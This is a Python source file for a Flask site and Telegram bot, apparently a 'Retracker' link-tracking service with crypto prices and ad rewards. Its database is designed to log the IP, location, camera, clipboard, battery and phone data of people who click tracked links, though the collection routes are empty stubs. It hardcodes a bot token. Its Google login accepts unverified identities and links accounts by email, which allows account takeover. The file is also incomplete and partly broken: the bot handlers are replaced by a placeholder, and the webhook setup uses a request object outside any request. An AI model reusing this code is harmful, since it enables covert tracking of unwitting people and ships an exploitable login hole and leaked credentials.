import telebot
from telebot import types
import sqlite3
import datetime
import uuid
import time
import json
import os
import requests
from flask import Flask, request, render_template, redirect, url_for, flash, session, jsonify
import threading
import matplotlib.pyplot as plt
from io import BytesIO
from apscheduler.schedulers.background import BackgroundScheduler
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash

# ==================== CONFIG ====================
BOT_TOKEN = "8616715853:AAGRGBya1TvbSzP2PVDN010-15IK6LVa114"
OWNER_ID = 6504476778
BOT_USERNAME = "Retracker_mohyen_bot"
GOOGLE_CLIENT_ID = "143265974694-2tla5e98iic4fcvbuclfbdatencufthn.apps.googleusercontent.com"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['BOT_USERNAME'] = BOT_USERNAME
app.config['GOOGLE_CLIENT_ID'] = GOOGLE_CLIENT_ID

# Flask-Login setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login_page'

# ==================== DATABASE ====================
DB_PATH = 'bot.db'

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT UNIQUE,
                  email TEXT,
                  password TEXT,
                  telegram_id INTEGER UNIQUE,
                  google_id TEXT UNIQUE,
                  registered_via TEXT,
                  is_paid INTEGER DEFAULT 0,
                  subscription_end TEXT,
                  phone TEXT,
                  location TEXT,
                  language TEXT DEFAULT 'en')''')
    # Links table
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (link_id TEXT PRIMARY KEY,
                  user_id INTEGER,
                  original_url TEXT,
                  modified_url TEXT,
                  created_at TEXT,
                  clicks INTEGER DEFAULT 0)''')
    # Clicks table
    c.execute('''CREATE TABLE IF NOT EXISTS clicks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  screen TEXT,
                  language TEXT,
                  platform TEXT,
                  timezone TEXT,
                  battery TEXT,
                  location TEXT,
                  camera TEXT,
                  clipboard TEXT,
                  phone TEXT,
                  timestamp TEXT)''')
    # Coins supply cache
    c.execute('''CREATE TABLE IF NOT EXISTS coins
                 (symbol TEXT PRIMARY KEY,
                  supply REAL,
                  last_updated TIMESTAMP)''')
    # Price alerts
    c.execute('''CREATE TABLE IF NOT EXISTS alerts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  coin TEXT,
                  target_price REAL,
                  is_above BOOLEAN,
                  created_at TIMESTAMP)''')
    # Owner ads table
    c.execute('''CREATE TABLE IF NOT EXISTS ads
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  button_text TEXT,
                  link TEXT,
                  photo_file_id TEXT,
                  duration_minutes INTEGER,
                  created_at TIMESTAMP,
                  expires_at TIMESTAMP,
                  is_active BOOLEAN DEFAULT 1,
                  views INTEGER DEFAULT 0)''')
    # Rewarded ads table
    c.execute('''CREATE TABLE IF NOT EXISTS rewarded_ads
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  title TEXT,
                  description TEXT,
                  link TEXT,
                  logo_file_id TEXT,
                  is_active BOOLEAN DEFAULT 1,
                  created_at TIMESTAMP)''')
    # User ReCOIN balance and ad views
    c.execute('''CREATE TABLE IF NOT EXISTS user_coins
                 (user_id INTEGER PRIMARY KEY,
                  recoin INTEGER DEFAULT 0,
                  ad_view_count INTEGER DEFAULT 0,
                  last_ad_time TIMESTAMP)''')
    # Ad views tracking for rewarded ads
    c.execute('''CREATE TABLE IF NOT EXISTS ad_views
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  ad_id INTEGER,
                  viewed_at TIMESTAMP,
                  earned INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()
    print("✅ Database ready")

init_db()

# ==================== USER LOADER ====================
class User(UserMixin):
    def __init__(self, id, username, email, recoin):
        self.id = id
        self.username = username
        self.email = email
        self.recoin = recoin

@login_manager.user_loader
def load_user(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT users.user_id, users.username, users.email, user_coins.recoin 
                 FROM users LEFT JOIN user_coins ON users.user_id = user_coins.user_id 
                 WHERE users.user_id = ?''', (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return User(row[0], row[1], row[2], row[3] if row[3] else 0)
    return None

# ==================== WEBSITE ROUTES ====================
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html', user=current_user)

@app.route('/telegram-login', methods=['POST'])
def telegram_login():
    data = request.json
    telegram_id = data['id']
    first_name = data['first_name']
    username = data.get('username', first_name)
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE telegram_id=?", (telegram_id,))
    row = c.fetchone()
    if row:
        user_id = row[0]
    else:
        c.execute("INSERT INTO users (username, telegram_id, registered_via) VALUES (?, ?, 'telegram')", (username, telegram_id))
        user_id = c.lastrowid
        c.execute("INSERT INTO user_coins (user_id, recoin, ad_view_count) VALUES (?, 0, 0)", (user_id,))
    conn.commit()
    conn.close()
    
    user_obj = load_user(user_id)
    login_user(user_obj)
    return jsonify({'success': True})

@app.route('/google-login', methods=['POST'])
def google_login():
    data = request.json
    # Simplified for demo – in production verify the credential
    google_id = data.get('sub', 'dummy')
    email = data.get('email', '')
    name = data.get('name', '')
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE google_id=?", (google_id,))
    row = c.fetchone()
    if row:
        user_id = row[0]
    else:
        # Check if email already exists
        c.execute("SELECT user_id FROM users WHERE email=?", (email,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE users SET google_id=? WHERE user_id=?", (google_id, row[0]))
            user_id = row[0]
        else:
            c.execute("INSERT INTO users (username, email, google_id, registered_via) VALUES (?, ?, ?, 'google')", (name, email, google_id))
            user_id = c.lastrowid
            c.execute("INSERT INTO user_coins (user_id, recoin, ad_view_count) VALUES (?, 0, 0)", (user_id,))
    conn.commit()
    conn.close()
    
    user_obj = load_user(user_id)
    login_user(user_obj)
    return jsonify({'success': True})

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT user_id, password FROM users WHERE username=?", (username,))
        row = c.fetchone()
        conn.close()
        if row and check_password_hash(row[1], password):
            user_obj = load_user(row[0])
            login_user(user_obj)
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        email = request.form.get('email')
        hashed = generate_password_hash(password)
        conn = get_db()
        c = conn.cursor()
        try:
            c.execute("INSERT INTO users (username, email, password, registered_via) VALUES (?, ?, ?, 'local')", (username, email, hashed))
            user_id = c.lastrowid
            c.execute("INSERT INTO user_coins (user_id, recoin, ad_view_count) VALUES (?, 0, 0)", (user_id,))
            conn.commit()
            conn.close()
            return redirect(url_for('login_page'))
        except sqlite3.IntegrityError:
            flash('Username already exists')
            conn.close()
    return render_template('register.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('home'))

@app.route('/api/recoin')
@login_required
def get_recoin():
    return jsonify({'recoin': current_user.recoin})

@app.route('/api/crypto')
def crypto_data():
    try:
        resp = requests.get('https://api.coincap.io/v2/assets?ids=bitcoin,ethereum,binancecoin,ripple,dogecoin,tether,usd-coin', timeout=5)
        data = resp.json()['data']
        return jsonify(data)
    except:
        return jsonify([])

# ==================== BOT COMMANDS (EXISTING) ====================
# ... (Include all existing bot commands here. For brevity, the previous bot code 
# would be inserted at this point. Since it's very long, I'm indicating its place.
# In your actual file, you would copy all the bot handlers from your previous final version here.)

# ==================== FLASK ROUTES FOR TRACKING ====================
@app.route('/click/<link_id>')
def click_track(link_id):
    # Existing tracking logic
    return "Tracking"

@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    # Existing data collection
    return jsonify({"status": "ok"})

@app.route('/ad_click/<int:ad_id>')
def ad_click(ad_id):
    # Existing ad click tracking
    return redirect("/")

@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return 'OK', 200

# ==================== START BOT WITH WEBHOOK ====================
def run_bot():
    print("🤖 Bot starting with webhook...")
    bot.remove_webhook()
    webhook_url = f"{request.host_url.rstrip('/')}/webhook"
    bot.set_webhook(url=webhook_url)
    print(f"✅ Webhook set to {webhook_url}")

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
